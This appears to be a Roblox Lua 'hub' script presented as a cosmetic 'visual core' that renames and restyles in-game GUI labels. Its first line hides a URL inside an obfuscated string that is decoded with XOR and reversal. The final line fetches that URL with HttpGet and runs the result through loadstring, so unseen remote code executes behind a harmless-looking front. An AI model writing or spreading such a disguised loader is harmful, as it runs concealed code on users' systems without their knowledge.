
--[[ STAGE 2: VISUAL CORE ]]
local REGw07wmpBYPHC="\145\161\140\078\149\156\182\173\185\103\136\138\114\149\123\193\200\226\217\229\147\225\231\250\253\231\007\175\242\253\009\001\195\006\011\021\044\022\037\054\034\045\237\047\076\067\059\001\079\077\080\091\105\115\120\031\127\125\121\112\144\123\135\133\156\163\161\143\118\087\157\159\175\102\196\174\189\208\186\191\207\226\213\235\237\226\245\228\252\237\243\174\011\005\022\191\195\218\039\044\044\048\032"local fSxlc789dnEezUKFaol=142 local fahjSAiMcCtbYvuc=152 local dBkdIKcFlVQhXhePuWuc=0 local LErtAD2cxLpOhsm0WGl=4 local _IH3pHMie4J4G=6 local NP3ELDp7PQkAAl=true local AKN48jxyqzS9ycQn4715q=bit32 and bit32.bxor if not AKN48jxyqzS9ycQn4715q then AKN48jxyqzS9ycQn4715q=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local ETog2T_PFbLW8wqEs0Vr={}for oMZBWBlCD8WCV3R=1,#REGw07wmpBYPHC do local WWsuEg0Kys62kAoT7qwON=string.byte(REGw07wmpBYPHC,oMZBWBlCD8WCV3R)local gTvM3izoWnOCOZ0_Srae=(fahjSAiMcCtbYvuc+(oMZBWBlCD8WCV3R*LErtAD2cxLpOhsm0WGl)+_IH3pHMie4J4G)%256 if dBkdIKcFlVQhXhePuWuc==0 then WWsuEg0Kys62kAoT7qwON=(WWsuEg0Kys62kAoT7qwON-gTvM3izoWnOCOZ0_Srae)%256 ETog2T_PFbLW8wqEs0Vr[oMZBWBlCD8WCV3R]=string.char(AKN48jxyqzS9ycQn4715q(WWsuEg0Kys62kAoT7qwON,fSxlc789dnEezUKFaol))else WWsuEg0Kys62kAoT7qwON=AKN48jxyqzS9ycQn4715q(WWsuEg0Kys62kAoT7qwON,fSxlc789dnEezUKFaol)ETog2T_PFbLW8wqEs0Vr[oMZBWBlCD8WCV3R]=string.char((WWsuEg0Kys62kAoT7qwON-gTvM3izoWnOCOZ0_Srae)%256)end end local Rj1lmNx04E94sZ=table.concat(ETog2T_PFbLW8wqEs0Vr)if NP3ELDp7PQkAAl then Rj1lmNx04E94sZ=string.reverse(Rj1lmNx04E94sZ)end local B4Wjk1E8lvMP=Rj1lmNx04E94sZ
local HubName = "ABRIKOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(B4Wjk1E8lvMP))()
